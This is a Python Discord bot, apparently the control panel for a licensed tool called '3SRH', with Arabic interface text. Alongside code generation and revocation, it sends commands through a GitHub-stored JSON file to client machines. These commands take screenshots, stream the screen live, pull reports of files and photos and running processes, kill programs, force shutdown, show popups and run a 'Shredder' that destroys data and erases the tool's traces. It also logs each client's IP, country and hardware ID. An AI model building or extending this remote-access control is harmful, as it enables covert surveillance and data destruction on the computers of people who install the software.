import os
import base64
import json
import random
import string
import time
import asyncio
import discord
from discord import app_commands
import requests
from flask import Flask
from threading import Thread

app = Flask('')

@app.route('/')
def home():
    return "3SRH Manager Bot is alive and running!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

keep_alive()

TOKEN = os.getenv('TOKEN')
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
REPO_OWNER = os.getenv('REPO_OWNER', 'kqi5q')
REPO_NAME = os.getenv('REPO_NAME', '3srh-system-data')
FILE_PATH = os.getenv('FILE_PATH', 'licenses.json')
CHANNEL_ID = int(os.getenv('CHANNEL_ID', 1547705815698382970))


class LicenseBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)

    async def setup_hook(self):
        await self.tree.sync()
        print("Slash commands synced successfully!")

    async def on_ready(self):
        print(f"Logged in as {self.user} (ID: {self.user.id})")
        print("Bot is online and ready!")


client = LicenseBot()


def generate_random_code():
    chars = string.ascii_uppercase + string.digits
    part = ''.join(random.choices(chars, k=5))
    return f"3SRH-{part}"


def fetch_db():
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
    headers = {"Authorization": f"Bearer {GITHUB_TOKEN}"}
    r = requests.get(url, headers=headers, timeout=5)
    if r.status_code == 200:
        file_data = r.json()
        db = json.loads(base64.b64decode(file_data["content"]).decode("utf-8"))
        return db, file_data["sha"], url, headers
    return None, None, url, headers


def save_db(db, sha, url, headers, commit_message):
    new_content = base64.b64encode(json.dumps(db, indent=4).encode("utf-8")).decode("utf-8")
    update_data = {
        "message": commit_message,
        "content": new_content,
        "sha": sha,
    }
    r = requests.put(url, headers=headers, json=update_data, timeout=5)
    return r.status_code in [200, 201]


class ConfirmSaveView(discord.ui.View):
    def __init__(self, generated_codes, count):
        super().__init__(timeout=60)
        self.generated_codes = generated_codes
        self.count = count

    @discord.ui.button(label="نعم، حفظ الأكواد", style=discord.ButtonStyle.green, custom_id="save_codes_yes")
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if not db:
            await interaction.followup.send("❌ فشل الاتصال بغيت هب.", ephemeral=True)
            return

        if "codes" not in db:
            db["codes"] = {}

        for code in self.generated_codes:
            db["codes"][code] = {"used": False, "device": None, "ip": None, "country": None}

        if save_db(db, sha, url, headers, f"Generated {self.count} new license codes"):
            codes_str = "\n".join([f"`{c}`" for c in self.generated_codes])
            try:
                await interaction.message.delete()
            except Exception:
                pass
            await interaction.followup.send(f"✅ **تم حفظ {self.count} كود:**\n\n{codes_str}", ephemeral=True)
        else:
            await interaction.followup.send("❌ فشل الحفظ في غيت هب.", ephemeral=True)

    @discord.ui.button(label="لا، إلغاء", style=discord.ButtonStyle.red, custom_id="save_codes_no")
    async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            await interaction.message.delete()
        except Exception:
            pass
        await interaction.response.send_message("❌ تم إلغاء العملية.", ephemeral=True)


class CodesSubMenuView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=180)

    @discord.ui.button(label="🟢 غير المستخدمة (المتاحة)", style=discord.ButtonStyle.success, custom_id="sub_codes_unused", row=0)
    async def unused_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, _, _, _ = fetch_db()
        if not db:
            await interaction.followup.send("❌ خطأ بالاتصال.", ephemeral=True)
            return
        unused_list = [c for c, info in db.get("codes", {}).items() if not info.get("used", False)]
        if not unused_list:
            await interaction.followup.send("🟢 لا توجد أكواد غير مستخدمة.", ephemeral=True)
            return
        view = UnusedManagementView(unused_list)
        await interaction.followup.send("🟢 **الأكواد غير المستخدمة (المتاحة - اختر للحذف):**", view=view, ephemeral=True)

    @discord.ui.button(label="🔴 المستخدمة والـ IP", style=discord.ButtonStyle.secondary, custom_id="sub_codes_used", row=0)
    async def used_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, _, _, _ = fetch_db()
        if not db:
            await interaction.followup.send("❌ خطأ.", ephemeral=True)
            return
        used_list = [f"`{c}` | IP: `{info.get('ip', 'غير معروف')}` | الدولة: `{info.get('country', 'غير معروف')}`" for c, info in db.get("codes", {}).items() if info.get("used")]
        if not used_list:
            await interaction.followup.send("🔴 لا توجد أكواد مستخدمة حالياً.", ephemeral=True)
            return
        text_out = "\n".join(used_list[:25])
        await interaction.followup.send(f"🔴 **الأكواد المستخدمة وتفاصيل الاتصال:**\n{text_out}", ephemeral=True)

    @discord.ui.button(label="🚫 المحظورة", style=discord.ButtonStyle.danger, custom_id="sub_codes_blacklist", row=1)
    async def blacklist_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, _, _, _ = fetch_db()
        if not db:
            await interaction.followup.send("❌ خطأ.", ephemeral=True)
            return
        b_codes = db.get("blacklisted_codes", [])
        if not b_codes:
            await interaction.followup.send("🟢 لا توجد أكواد محظورة حالياً.", ephemeral=True)
            return
        view = BlacklistManagementView(b_codes)
        await interaction.followup.send("🚫 **الأكواد المحظورة (اختر لفك الحظر أو الحذف):**", view=view, ephemeral=True)

    @discord.ui.button(label="⚡ توليد كود سريع", style=discord.ButtonStyle.primary, custom_id="sub_codes_gen", row=1)
    async def gen_quick_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if not db:
            await interaction.followup.send("❌ فشل الاتصال بقاعدة البيانات.", ephemeral=True)
            return
        if "codes" not in db:
            db["codes"] = {}
        new_code = generate_random_code()
        db["codes"][new_code] = {"used": False, "device": None, "ip": None, "country": None}
        if save_db(db, sha, url, headers, f"Quick generated code {new_code}"):
            await interaction.followup.send(f"✨ **تم توليد وحفظ كود جديد بنجاح!**\n🔑 الكود: `{new_code}`", ephemeral=True)
        else:
            await interaction.followup.send("❌ فشل حفظ الكود في غيت هب.", ephemeral=True)


class UnusedManagementView(discord.ui.View):
    def __init__(self, unused_codes):
        super().__init__(timeout=180)
        for code in unused_codes[:25]:
            self.add_item(DeleteUnusedCodeButton(code))

class DeleteUnusedCodeButton(discord.ui.Button):
    def __init__(self, code):
        super().__init__(label=f"🗑️ حذف: {code}", style=discord.ButtonStyle.danger, custom_id=f"del_Unused_{code}")
        self.code = code

    async def callback(self, interaction: discord.Interaction):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if not db:
            await interaction.followup.send("❌ خطأ بالاتصال.", ephemeral=True)
            return
        if self.code in db.get("codes", {}):
            del db["codes"][self.code]
            if save_db(db, sha, url, headers, f"Delete unused code {self.code}"):
                await interaction.followup.send(f"🗑️ تم حذف الكود المتاح `{self.code}` نهائياً!", ephemeral=True)
                return
        await interaction.followup.send("❌ الكود غير موجود.", ephemeral=True)


class BlacklistManagementView(discord.ui.View):
    def __init__(self, b_codes):
        super().__init__(timeout=180)
        for code in b_codes[:24]:
            self.add_item(BlacklistActionSelectButton(code))

class BlacklistActionSelectButton(discord.ui.Button):
    def __init__(self, code):
        super().__init__(label=f"🚫 {code}", style=discord.ButtonStyle.secondary, custom_id=f"b_select_{code}")
        self.code = code

    async def callback(self, interaction: discord.Interaction):
        view = BlacklistOptionsView(self.code)
        await interaction.response.send_message(f"⚙️ **خيارات الكود المحظور:** `{self.code}`", view=view, ephemeral=True)

class BlacklistOptionsView(discord.ui.View):
    def __init__(self, code):
        super().__init__(timeout=60)
        self.code = code

    @discord.ui.button(label="🔓 فك الحظر", style=discord.ButtonStyle.success, custom_id="b_opt_unban")
    async def unban_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if not db: return
        if self.code in db.get("blacklisted_codes", []):
            db["blacklisted_codes"].remove(self.code)
        if self.code in db.get("codes", {}):
            db["codes"][self.code]["used"] = False
            db["codes"][self.code]["device"] = None
        if save_db(db, sha, url, headers, f"Unban code {self.code}"):
            await interaction.followup.send(f"✅ تم فك الحظر عن الكود `{self.code}`!", ephemeral=True)

    @discord.ui.button(label="🗑️ حذف نهائي", style=discord.ButtonStyle.danger, custom_id="b_opt_delete")
    async def delete_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if not db: return
        if self.code in db.get("blacklisted_codes", []):
            db["blacklisted_codes"].remove(self.code)
        if self.code in db.get("codes", {}):
            del db["codes"][self.code]
        if save_db(db, sha, url, headers, f"Delete blacklisted {self.code}"):
            await interaction.followup.send(f"🗑️ تم حذف الكود المحظور `{self.code}`!", ephemeral=True)


class DevicesSubMenuView(discord.ui.View):
    def __init__(self, devices_list):
        super().__init__(timeout=180)
        for code, info in devices_list[:25]:
            self.add_item(DeviceManageButton(code, info))

class DeviceManageButton(discord.ui.Button):
    def __init__(self, code, info):
        ip = info.get("ip", "Unknown")
        super().__init__(label=f"🌐 IP: {ip} ({code})", style=discord.ButtonStyle.secondary, custom_id=f"man_dev_{code}")
        self.code = code
        self.info = info

    async def callback(self, interaction: discord.Interaction):
        view = DeviceActionsView(self.code, self.info.get("device"), self.info.get("ip"))
        await interaction.response.send_message(
            f"⚙️ **لوحة التحكم المطلق بالعميل:**\n🔑 الكود: `{self.code}`\n🌐 IP العميل: `{self.info.get('ip')}`\n🌍 الدولة: `{self.info.get('country')}`\n🔒 HWID: `{self.info.get('device')}`", 
            view=view, 
            ephemeral=True
        )

class DeviceActionsView(discord.ui.View):
    def __init__(self, code, hwid, ip):
        super().__init__(timeout=60)
        self.code = code
        self.hwid = hwid
        self.ip = ip

    @discord.ui.button(label="🚫 حظر الكود والهاردوير", style=discord.ButtonStyle.danger, custom_id="dev_act_ban", row=0)
    async def ban_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "blacklisted_codes" not in db: db["blacklisted_codes"] = []
            if "blacklisted_devices" not in db: db["blacklisted_devices"] = []
            if self.code not in db["blacklisted_codes"]: db["blacklisted_codes"].append(self.code)
            if self.hwid and self.hwid not in db["blacklisted_devices"]: db["blacklisted_devices"].append(self.hwid)
            db["codes"][self.code]["used"] = False
            db["codes"][self.code]["device"] = None
            if save_db(db, sha, url, headers, f"Ban HWID {self.hwid}"):
                await interaction.followup.send(f"🚫 تم حظر الكود والهاردوير للـ IP: `{self.ip}` بنجاح!", ephemeral=True)

    @discord.ui.button(label="👢 طرد بدون حظر", style=discord.ButtonStyle.primary, custom_id="dev_act_kick", row=0)
    async def kick_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "targeted_kick_messages" not in db: db["targeted_kick_messages"] = {}
            db["targeted_kick_messages"][self.code] = {"msg": "تم طردك من المالك", "id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Kick {self.ip}"):
                await interaction.followup.send(f"👢 تم إرسال أمر الطرد للـ IP: `{self.ip}`!", ephemeral=True)

    @discord.ui.button(label="📁 سحب تقرير الجهاز (TXT)", style=discord.ButtonStyle.primary, custom_id="dev_act_export_info", row=1)
    async def export_client_info_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_exports" not in db: db["remote_exports"] = {}
            db["remote_exports"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Export telemetry for {self.code}"):
                await interaction.followup.send("📁 تم طلب ملف التقرير ومعلومات الجهاز، سيصلك هنا قريباً!", ephemeral=True)

    @discord.ui.button(label="📸 سحب تقرير الملفات والصور", style=discord.ButtonStyle.secondary, custom_id="dev_act_files_report", row=1)
    async def files_report_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_file_reports" not in db: db["remote_file_reports"] = {}
            db["remote_file_reports"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Request files report for {self.code}"):
                await interaction.followup.send("📸 تم طلب تقرير الملفات والصور، سيصلك الملف المرفق هنا خلال لحظات!", ephemeral=True)

    @discord.ui.button(label="📋 فحص البرامج المفتوحة", style=discord.ButtonStyle.primary, custom_id="dev_act_procs", row=2)
    async def procs_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_procs_check" not in db: db["remote_procs_check"] = {}
            db["remote_procs_check"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Check running processes for {self.code}"):
                await interaction.followup.send("📋 تم طلب قائمة البرامج النشطة، سيصلك ملف التقرير هنا خلال لحظات!", ephemeral=True)

    @discord.ui.button(label="🔴 بدء البث الحي للشاشة", style=discord.ButtonStyle.danger, custom_id="dev_act_live", row=2)
    async def live_stream_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_live_stream" not in db: db["remote_live_stream"] = {}
            db["remote_live_stream"][self.code] = {"id": str(int(time.time())), "port": 8888}
            if save_db(db, sha, url, headers, f"Start live stream for {self.code}"):
                client_ip = db.get("codes", {}).get(self.code, {}).get("ip", "IP_غير_معروف")
                await interaction.followup.send(f"🔴 **تم تشغيل خادم البث الحي على جهاز العميل!**\n🌐 يمكنك فتح نافذة المشاهدة عبر الرابط التالي في المتصفح لديك:\n`http://{client_ip}:8888/stream`", ephemeral=True)

    @discord.ui.button(label="💬 إرسال رسالة منبثقة", style=discord.ButtonStyle.primary, custom_id="dev_act_msg", row=3)
    async def send_msg_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(SendMsgModal(self.code))

    @discord.ui.button(label="🪟 إغلاق الألعاب والخلفية", style=discord.ButtonStyle.secondary, custom_id="dev_act_kill", row=3)
    async def kill_proc_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_killers" not in db: db["remote_killers"] = {}
            db["remote_killers"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Kill background processes for {self.code}"):
                await interaction.followup.send("🪟 تم إرسال أمر إغلاق جميع الألعاب والبرامج الخلفية للعميل بنجاح!", ephemeral=True)

    @discord.ui.button(label="🔌 إيقاف تشغيل الجهاز (Shutdown)", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=4)
    async def shutdown_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_shutdowns" not in db: db["remote_shutdowns"] = {}
            db["remote_shutdowns"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Shutdown {self.code}"):
                await interaction.followup.send("🔌 تم إرسال أمر إيقاف التشغيل الفوري لجهاز العميل!", ephemeral=True)

    @discord.ui.button(label="🔥 تدمير شامل (Shredder)", style=discord.ButtonStyle.danger, custom_id="dev_act_shred", row=4)
    async def shred_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_shreds" not in db: db["remote_shreds"] = {}
            db["remote_shreds"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Shred {self.code}"):
                await interaction.followup.send("🔥 تم إرسال أمر التدمير الشامل وحذف أثر الأداة!", ephemeral=True)


class SendMsgModal(discord.ui.Modal, title="إرسال رسالة تحذيرية للعميل"):
    message_content = discord.ui.TextInput(label="نص الرسالة", style=discord.TextStyle.paragraph, placeholder="اكتب الرسالة التي ستظهر للعميل...")

    def __init__(self, code):
        super().__init__()
        self.code = code

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "targeted_messages" not in db: db["targeted_messages"] = {}
            db["targeted_messages"][self.code] = {"msg": str(self.message_content), "id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Send message to {self.code}"):
                await interaction.followup.send(f"💬 تم إرسال الرسالة إلى العميل بنجاح!", ephemeral=True)


class MainDashboardView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🔑 إدارة الأكواد", style=discord.ButtonStyle.primary, custom_id="dash_main_codes", row=0)
    async def codes_menu_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        view = CodesSubMenuView()
        await interaction.response.send_message("📁 **قائمة إدارة الأكواد:** اختر القسم المطلوب:", view=view, ephemeral=True)

    @discord.ui.button(label="💻 الأجهزة والتحكم المطلق", style=discord.ButtonStyle.secondary, custom_id="dash_main_devices", row=0)
    async def devices_menu_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        try:
            db, _, _, _ = fetch_db()
            if not db:
                await interaction.followup.send("❌ فشل الاتصال بقاعدة البيانات من غيت هب.", ephemeral=True)
                return

            codes = db.get("codes", {})
            devices_list = []
            for code, info in codes.items():
                if info.get("used") and info.get("device"):
                    devices_list.append((code, info))

            if not devices_list:
                await interaction.followup.send("🟢 لا توجد أي أجهزة متصلة حالياً.", ephemeral=True)
                return

            view = DevicesSubMenuView(devices_list)
            await interaction.followup.send("⚙️ **اختر الجهاز للتحكم الكامل به:**", view=view, ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ حدث خطأ غير متوقع: {str(e)}", ephemeral=True)

    @discord.ui.button(label="🚨 تبديل الصيانة", style=discord.ButtonStyle.danger, custom_id="dash_maint", row=1)
    async def maint_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if not db: return
        if "settings" not in db: db["settings"] = {}
        new_status = not db["settings"].get("maintenance", False)
        db["settings"]["maintenance"] = new_status
        msg = f"🚨 تم **تفعيل** وضع الصيانة العام!" if new_status else "🟢 تم **إيقاف** وضع الصيانة وعودة النظام للعمل!"
        if save_db(db, sha, url, headers, f"Toggle maintenance to {new_status}"):
            await interaction.followup.send(msg, ephemeral=True)

    @discord.ui.button(label="📦 نسخة احتياطية", style=discord.ButtonStyle.secondary, custom_id="dash_export", row=1)
    async def export_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, _, _, _ = fetch_db()
        if not db: return
        file_content = json.dumps(db, indent=4).encode("utf-8")
        file_path_temp = "licenses_backup.json"
        with open(file_path_temp, "wb") as f: f.write(file_content)
        try:
            await interaction.user.send("📦 **نسخة احتياطية مباشرة:**", file=discord.File(file_path_temp))
            await interaction.followup.send("✅ تم إرسال النسخة لخاصك (DM)!", ephemeral=True)
        except Exception:
            await interaction.followup.send("❌ تأكد من فتح الرسائل الخاصة.", ephemeral=True)
        if os.path.exists(file_path_temp): os.remove(file_path_temp)


@client.tree.command(name="generate", description="توليد أكواد تفعيل جديدة")
@app_commands.describe(count="عدد الأكواد (من 1 إلى 20)")
async def generate_codes(interaction: discord.Interaction, count: int = 1):
    if count < 1 or count > 20:
        await interaction.response.send_message("❌ يمكنك توليد ما بين 1 إلى 20 كوداً فقط.", ephemeral=True)
        return
    new_codes = [generate_random_code() for _ in range(count)]
    codes_str = "\n".join([f"`{c}`" for c in new_codes])
    await interaction.response.send_message(f"⚠️ **حفظ الأكواد التالية؟**\n\n{codes_str}", view=ConfirmSaveView(new_codes, count), ephemeral=True)


@client.tree.command(name="unused", description="عرض الأكواد غير المستخدمة مع خيارات الحذف")
async def unused_command(interaction: discord.Interaction):
    await interaction.response.defer(thinking=True, ephemeral=True)
    db, _, _, _ = fetch_db()
    if not db: return
    unused_list = [c for c, info in db.get("codes", {}).items() if not info.get("used", False)]
    if not unused_list:
        await interaction.followup.send("🟢 لا توجد أكواد غير مستخدمة.", ephemeral=True)
        return
    view = UnusedManagementView(unused_list)
    await interaction.followup.send(f"🟢 **الأكواد المتاحة (اختر للحذف):**\n📊 العدد: `{len(unused_list)}`", view=view, ephemeral=True)


@client.tree.command(name="clearused", description="حذف جميع الأكواد المستخدمة دفعة واحدة")
async def clear_used_codes(interaction: discord.Interaction):
    await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = fetch_db()
    if not db or "codes" not in db: return
    old_count = len(db["codes"])
    db["codes"] = {c: info for c, info in db["codes"].items() if not info.get("used", False)}
    removed = old_count - len(db["codes"])
    if save_db(db, sha, url, headers, f"Cleared {removed} used codes"):
        await interaction.followup.send(f"🧹 تم حذف `{removed}` كود مستخدم!", ephemeral=True)


@client.tree.command(name="check", description="التحقق من حالة كود معين ومعرفة تفاصيله")
@app_commands.describe(code="الكود المراد فحصه")
async def check_code(interaction: discord.Interaction, code: str):
    await interaction.response.defer(thinking=True, ephemeral=True)
    db, _, _, _ = fetch_db()
    if not db or code.upper() not in db.get("codes", {}):
        await interaction.followup.send(f"❌ الكود غير موجود.", ephemeral=True)
        return
    info = db["codes"][code.upper()]
    status = "مستخدم 🔴" if info.get("used") else "متاح 🟢"
    await interaction.followup.send(
        f"🔍 **الكود `{code.upper()}`:**\n📌 الحالة: {status}\n🌐 IP: `{info.get('ip') or 'غير متصل'}`\n🌍 الدولة: `{info.get('country') or 'غير معروفة'}`\n💻 HWID: `{info.get('device') or 'لا يوجد'}`", 
        ephemeral=True
    )


@client.tree.command(name="delete", description="حذف كود نهائياً")
@app_commands.describe(code="الكود المراد حذفه")
async def delete_code(interaction: discord.Interaction, code: str):
    await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = fetch_db()
    code = code.upper()
    if not db or code not in db.get("codes", {}):
        await interaction.followup.send(f"❌ الكود غير موجود.", ephemeral=True)
        return
    del db["codes"][code]
    if save_db(db, sha, url, headers, f"Delete code: {code}"):
        await interaction.followup.send(f"🗑️ تم حذف الكود `{code}` نهائياً!", ephemeral=True)


@client.tree.command(name="resetdevice", description="تصفير ارتباط الكود وإرجاعه متاحاً")
@app_commands.describe(code="الكود المراد تصفيره")
async def reset_device(interaction: discord.Interaction, code: str):
    await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = fetch_db()
    code = code.upper()
    if not db or code not in db.get("codes", {}):
        await interaction.followup.send(f"❌ الكود غير موجود.", ephemeral=True)
        return
    db["codes"][code]["used"] = False
    db["codes"][code]["device"] = None
    db["codes"][code]["ip"] = None
    db["codes"][code]["country"] = None
    if save_db(db, sha, url, headers, f"Reset code: {code}"):
        await interaction.followup.send(f"🔄 تم تصفير الكود `{code}` وأصبح متاحاً!", ephemeral=True)


@client.tree.command(name="screenshot", description="التقاط لقطة شاشة (Screenshot) لجهاز عميل معين عبر اسمه أو كوده")
@app_commands.describe(target="اسم الجهاز أو كود التفعيل المستهدف")
async def screenshot_command(interaction: discord.Interaction, target: str):
    await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = fetch_db()
    if not db:
        await interaction.followup.send("❌ فشل الاتصال بقاعدة البيانات.", ephemeral=True)
        return

    target_upper = target.strip().upper()
    target_clean = target.strip()
    
    found_key = None
    if target_upper in db.get("codes", {}):
        found_key = target_upper
    else:
        for c, info in db.get("codes", {}).items():
            if info.get("device") and target_clean.lower() in info.get("device").lower():
                found_key = c
                break

    if not found_key:
        await interaction.followup.send(f"❌ لم يتم العثور على الجهاز أو الكود: `{target}`", ephemeral=True)
        return

    if "remote_screenshots" not in db:
        db["remote_screenshots"] = {}
    
    db["remote_screenshots"][found_key] = {"id": str(int(time.time()))}
    
    if save_db(db, sha, url, headers, f"Request screenshot for target {found_key}"):
        await interaction.followup.send(f"📸 **تم إرسال أمر التقاط الشاشة بنجاح!** سيصلك ملف الصورة هنا خلال لحظات لجهاز الكود: `{found_key}`", ephemeral=True)
    else:
        await interaction.followup.send("❌ فشل إرسال أمر التقاط الشاشة.", ephemeral=True)


@client.tree.command(name="statsgui", description="لوحة معلومات وإحصائيات تفاعلية")
async def stats_gui_command(interaction: discord.Interaction):
    db, _, _, _ = fetch_db()
    if not db: return
    codes = db.get("codes", {})
    total = len(codes)
    used = sum(1 for c in codes.values() if c.get("used"))
    available = total - used
    embed = discord.Embed(
        title="📊 لوحة التحكم والإحصائيات الشاملة",
        description="اختر القسم المطلوب من الأزرار أدناه:",
        color=0xA871FF
    )
    embed.add_field(name="📌 الإجمالي", value=f"`{total}`", inline=True)
    embed.add_field(name="🟢 المتاحة", value=f"`{available}`", inline=True)
    embed.add_field(name="🔴 المستخدمة", value=f"`{used}`", inline=True)
    await interaction.response.send_message(embed=embed, view=MainDashboardView(), ephemeral=True)


@client.tree.command(name="clear", description="حذف رسائل البوت وتنظيف الشاشة")
@app_commands.describe(amount="عدد الرسائل المراد مسحها (افتراضي 10)")
async def clear_messages(interaction: discord.Interaction, amount: int = 10):
    await interaction.response.defer(thinking=True, ephemeral=True)
    deleted = await interaction.channel.purge(limit=amount)
    await interaction.followup.send(f"🧹 تم تنظيف وحذف `{len(deleted)}` رسالة بنجاح!", ephemeral=True)
    await asyncio.sleep(3)
    try:
        await interaction.delete_original_response()
    except Exception:
        pass


@client.tree.command(name="sync", description="مزامنة الأوامر")
async def sync_commands(interaction: discord.Interaction):
    await client.tree.sync()
    await interaction.response.send_message("✅ تم مزامنة الأوامر!", ephemeral=True)


if TOKEN:
    client.run(TOKEN)
